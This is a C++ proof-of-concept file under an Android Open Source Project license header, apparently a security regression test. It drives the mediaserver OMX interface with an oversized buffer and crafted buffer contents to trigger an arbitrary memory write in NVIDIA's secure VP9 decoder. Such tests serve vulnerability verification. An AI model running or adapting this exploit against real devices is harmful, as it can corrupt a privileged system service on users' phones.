/**
 * Copyright (C) 2017 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions vand
 * limitations under the License.
 */
#define _GNU_SOURCE
#include <binder/IPCThreadState.h>
#include <binder/IServiceManager.h>
#include <binder/MemoryDealer.h>
#include <binder/ProcessState.h>
#include <media/IMediaPlayerService.h>
#include <media/IOMX.h>
#include <media/hardware/HardwareAPI.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <utils/NativeHandle.h>
#include <utils/String16.h>
#include "OMXUtils.h"
#include "OMX_Component.h"
#include "OMX_IndexExt.h"
#include "include/OMX.h"

using namespace android;

struct DummyOMXObserver : public BnOMXObserver {
 public:
  DummyOMXObserver() {}

  virtual void onMessages(const std::list<omx_message> &messages) {}

 protected:
  virtual ~DummyOMXObserver() {}
};

extern bool connectOMX(sp<IOMX> &omx);
void poc_vp9_arbitrary_write(void);

extern bool connectOMX(sp<IOMX> &omx) {
  sp<IBinder> binder;
  sp<IServiceManager> sm = defaultServiceManager();

  binder = sm->getService(String16("media.player"));
  sp<IMediaPlayerService> service = interface_cast<IMediaPlayerService>(binder);

  if (binder == NULL) {
    return false;
  }
  omx = service->getOMX();
  if (omx == NULL) {
    return false;
  }
  return true;
}

void poc_vp9_arbitrary_write() {
  sp<IOMX> service;
  sp<IBinder> binder;
  sp<IServiceManager> sm = defaultServiceManager();

  binder = sm->getService(String16("media.player"));
  sp<IMediaPlayerService> mediaPlayerService =
      interface_cast<IMediaPlayerService>(binder);

  if (binder == NULL) {
    return;
  }

  service = mediaPlayerService->getOMX();
  if (service == NULL) {
    return;
  }

  IOMX::node_id node = 0;
  int fenceFd = -1;
  sp<DummyOMXObserver> observer = new DummyOMXObserver();
  const char *codecName = "OMX.Nvidia.vp9.decode.secure";
  status_t err = service->allocateNode(codecName, observer, nullptr, &node);
  if (err != OK) {
    return;
  }

  OMX_PARAM_PORTDEFINITIONTYPE def;
  InitOMXParams(&def);
  def.nPortIndex = 0;
  OMX_INDEXTYPE omx_indextype = OMX_IndexParamPortDefinition;
  err = service->getParameter(node, omx_indextype, &def, sizeof(def));

  def.nBufferCountActual = 10;
  def.nBufferSize = 0x6000100;
  err = service->setParameter(node, omx_indextype, &def, sizeof(def));

  int inMemSize = def.nBufferCountActual * def.nBufferSize;
  int inBufferCnt = def.nBufferCountActual;
  int inBufferSize = inMemSize / inBufferCnt;
  sp<MemoryDealer> dealerIn = new MemoryDealer(inMemSize);
  IOMX::buffer_id *inBufferId = new IOMX::buffer_id[inBufferCnt];

  InitOMXParams(&def);
  def.nPortIndex = 1;
  err = service->getParameter(node, omx_indextype, &def, sizeof(def));

  int outMemSize = def.nBufferCountActual * def.nBufferSize;
  int outBufferCnt = def.nBufferCountActual;
  if (outBufferCnt == 0) {
    return;
  }
  int outBufferSize = outMemSize / outBufferCnt;
  sp<MemoryDealer> dealerOut = new MemoryDealer(outMemSize);
  IOMX::buffer_id *outBufferId = new IOMX::buffer_id[outBufferCnt];

  err = service->enableNativeBuffers(node, 0, (OMX_BOOL)0, (OMX_BOOL)1);

  for (int i = 0; i < inBufferCnt; i++) {
    sp<IMemory> memory = dealerIn->allocate(inBufferSize);
    if (memory == NULL || memory->pointer() == NULL) return;
    memset(memory->pointer(), 0x1f, inBufferSize);
    *((unsigned long *)memory->pointer() + 4) = 0x6000000;
    *((long *)memory->pointer() + 3) = 0xc;
    err = service->useBuffer(node, 0, memory, &inBufferId[i], inBufferSize);
  }

  for (int i = 0; i < outBufferCnt; i++) {
    sp<IMemory> memory = dealerOut->allocate(outBufferSize);
    if (memory == NULL || memory->pointer() == NULL) {
      return;
    }
    memset(memory->pointer(), 0xdf, outBufferSize);

    err = service->allocateBufferWithBackup(node, 1, memory, &outBufferId[i],
                                            outBufferSize);
  }

  err = service->sendCommand(node, OMX_CommandStateSet, 2);

  err = service->sendCommand(node, OMX_CommandStateSet, 3);

  sleep(1);

  for (int i = 0; i < inBufferCnt; i++) {
    err = service->emptyBuffer(node, inBufferId[i], 0, inBufferSize, 0, 0,
                               fenceFd);
  }

  for (int i = 0; i < outBufferCnt; i++) {
    err = service->fillBuffer(node, outBufferId[i], fenceFd);
  }

  err = service->freeNode(node);
}

int main(void) {
  poc_vp9_arbitrary_write();
  return 0;
}
